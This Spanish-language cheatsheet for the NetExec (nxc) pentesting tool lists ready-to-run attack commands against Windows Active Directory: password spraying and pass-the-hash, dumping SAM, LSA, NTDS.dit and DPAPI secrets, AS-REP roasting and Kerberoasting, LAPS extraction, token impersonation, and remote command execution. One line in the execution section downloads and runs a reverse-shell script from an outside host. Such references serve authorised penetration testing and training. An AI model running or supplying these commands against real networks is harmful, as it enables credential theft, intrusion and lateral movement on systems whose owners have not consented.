# NetExec (nxc) — Cheatsheet

Guía de referencia rápida y comandos esenciales para **NetExec (NXC)** en auditorías de Active Directory, SMB, WinRM, LDAP, MSSQL y RDP.

---

## Enumeración de hosts y servicios

```bash
# Generar archivo de hosts vivos
nxc smb <IP_O_RANGO> --generate-hosts-file hosts

# Escaneo de servicio en objetivo o subred
nxc smb 192.168.1.100
nxc smb 192.168.1.0/24
nxc winrm 10.10.10.0/24
```

---

## Enumeración de Dominio y Recursos

### Usuarios y Grupos
```bash
# Usuarios del dominio
nxc smb IP -u usuario -p contraseña --users
nxc smb IP -u usuario -p contraseña --users admin

# Usuarios logueados actualmente en el equipo
nxc smb IP -u usuario -p contraseña --loggedon-users

# Grupos del dominio y locales
nxc smb IP -u usuario -p contraseña --groups
nxc smb IP -u usuario -p contraseña --groups "Domain Admins"
nxc smb IP -u usuario -p contraseña --local-groups

# Equipos registrados en el dominio
nxc smb IP -u usuario -p contraseña --computers
```

### Recursos compartidos (Shares)
```bash
# Listar recursos compartidos y permisos
nxc smb IP -u usuario -p contraseña --shares

# Escanear recursivamente contenido de carpetas compartidas
nxc smb IP -u usuario -p contraseña -M spider_plus
```

---

## Fuerza Bruta y Password Spraying

```bash
# Password spraying básico (un password para muchos usuarios)
nxc smb IP -u usuarios.txt -p 'Password123!'
nxc winrm 192.168.1.0/24 -u admin -p passwords.txt

# Con hashes NTLM (Pass-The-Hash)
nxc smb IP -u admin -H <NTLM_HASH>
nxc smb IP -u usuarios.txt -H hashes.txt

# Continuar tras encontrar credenciales válidas
nxc smb IP -u usuarios.txt -p passwords.txt --continue-on-success

# Credenciales pares (user1:pass1, user2:pass2) sin combinar
nxc smb IP -u usuarios.txt -p passwords.txt --no-bruteforce

# Puerto personalizado
nxc smb IP -u admin -p pass --port 4455
```

---

## Dump de Credenciales

```bash
# SAM local
nxc smb IP -u admin -p pass --sam
nxc winrm IP -u admin -p pass --sam

# LSA Secrets
nxc smb IP -u admin -p pass --lsa
nxc winrm IP -u admin -p pass --lsa

# Base de datos NTDS.dit (Controlador de Dominio)
nxc smb IP -u admin -p pass --ntds
nxc smb IP -u admin -p pass --ntds vss
nxc smb IP -u admin -p pass --ntds drsuapi
nxc smb IP -u admin -p pass --ntds --user administrator

# Secretos y credenciales de DPAPI
nxc smb IP -u admin -p pass --dpapi
nxc smb IP -u admin -p pass --dpapi cookies
```

---

## Ataques Kerberos

```bash
# AS-REP Roasting (cuentas sin requerir preautenticación Kerberos)
nxc ldap IP -u usuario -p contraseña --asreproast
nxc ldap IP -u usuarios.txt -p '' --asreproast

# Kerberoasting (solicitud de TGS para cuentas SPN)
nxc ldap IP -u usuario -p contraseña --kerberoasting
nxc ldap IP -u usuarios.txt -p contraseña --kerberoasting
```

---

## Ejecución Remota de Comandos

```bash
# Vía CMD
nxc smb IP -u admin -p pass -x "whoami"
nxc smb IP -u admin -p pass -x "ipconfig /all"
nxc smb IP -u admin -p pass -x "net localgroup administrators"

# Vía PowerShell
nxc smb IP -u admin -p pass -X "Get-Process"
nxc smb IP -u admin -p pass -X "Get-LocalUser"
nxc smb IP -u admin -p pass -X "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://10.10.14.25/rev.ps1')"

# Métodos específicos de ejecución
nxc smb IP -u admin -p pass --exec-method wmiexec -x whoami
nxc smb IP -u admin -p pass --exec-method smbexec -x whoami
nxc smb IP -u admin -p pass --exec-method atexec -x whoami
nxc smb IP -u admin -p pass --exec-method mmcexec -x whoami
```

---

## Módulos Útiles

```bash
# Habilitar RDP remotamente
nxc smb IP -u admin -p pass -M rdp -o ACTION=enable

# Detectar soluciones antivirus y EDR activas
nxc smb IP -u admin -p pass -M enum_avproducts

# Extraer contraseñas de LAPS
nxc ldap IP -u user -p pass -M laps

# Suplantación de tokens en memoria
nxc smb IP -u admin -p pass -M impersonate

# Detectar AlwaysInstallElevated en el registro
nxc smb IP -u admin -p pass -M install_elevated

# Localizar bases de datos de KeePass
nxc smb IP -u admin -p pass -M keypass_discover
```

---

## Modos de Autenticación Especial

```bash
# Autenticación Local (en lugar de cuenta de dominio)
nxc smb IP -u admin -p pass --local-auth

# Pass-The-Hash (NTLM)
nxc smb IP -u admin -H <NTLM_HASH>
nxc winrm IP -u admin -H <NTLM_HASH>
nxc rdp IP -u admin -H <NTLM_HASH>

# Pass-The-Ticket (Kerberos Ticket .kirbi)
nxc smb IP -k -u admin --kerberos-ticket ticket.kirbi
```

---

## Técnicas Avanzadas y Recolección

```bash
# Recolección completa de datos para BloodHound
nxc ldap IP -u user -p pass --bloodhound --collection All

# PowerShell con ofuscación automática
nxc winrm IP -u admin -p pass -X "Get-Process" --obfs

# Captura de pantalla de sesión RDP activa (sin NLA)
nxc rdp IP -u admin -p pass --screenshot
nxc rdp IP -u admin -p pass --screenshot --screentime 5
nxc rdp IP -u admin -p pass --nla-screenshot
```
